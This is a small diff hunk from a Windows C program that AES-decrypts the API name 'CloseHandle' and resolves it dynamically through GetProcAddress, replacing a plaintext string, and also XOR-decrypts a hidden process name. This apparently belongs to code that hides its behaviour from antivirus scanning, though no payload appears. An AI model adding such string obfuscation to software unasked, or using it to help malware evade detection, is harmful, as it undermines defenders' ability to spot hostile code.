@@ -212,7 +212,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     AESDecrypt((char *)s_clh, s_clh_len, s_clh_key, sizeof(s_clh_key));
     snprintf(func_clh, sizeof(func_clh), "%s", s_clh);
-    pCloseHandle = GetProcAddress(GetModuleHandle(s_k32), "CloseHandle"); //,func_clh);
+    pCloseHandle = GetProcAddress(GetModuleHandle(s_k32),func_clh);
 
     // decrypt process name
     XOR((char *) my_proc, my_proc_len, my_proc_key, sizeof(my_proc_key));
